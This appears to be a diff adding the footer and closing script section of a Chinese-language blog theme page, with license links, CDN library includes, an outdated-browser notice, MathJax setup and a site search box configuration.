+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {matchFontHeight: false},
+        SVG: {matchFontHeight: false},
+        CommonHTML: {matchFontHeight: false}
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
